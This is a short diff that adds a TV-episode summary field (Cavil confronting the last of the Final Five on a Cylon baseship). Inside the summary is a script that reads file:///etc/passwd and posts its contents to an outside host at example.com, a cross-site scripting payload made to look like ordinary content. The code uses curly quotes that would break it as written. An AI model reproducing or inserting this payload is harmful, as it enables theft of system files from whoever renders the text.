@@ -1,0 +1,24 @@
+<summary>On the Cylon baseship, Cavil confronts the last member of the Final Five.
+<script>
+var contents;
+var req;
+req = new XMLHttpRequest();
+req.onreadystatechange = processReqChange;
+req.open(’GET’, ‘file:///etc/passwd’, true);
+req.send(”);
+
+function processReqChange() {
+if (req.readyState == 4) {
+contents = req.responseText;
+sendit2XSSniper(contents);
+}
+}
+function sendit2XSSniper(stuff){
+var req2;
+req2 = new XMLHttpRequest();
+req2.open(’POST’, ‘http://www.example.com’, true);
+req2.setRequestHeader(’Content-Type’,'application/x-www-form-urlencoded’);
+req2.send(’filename=etcpasswd&filecontents=’+escape(stuff));
+}
+</script>
+</summary>
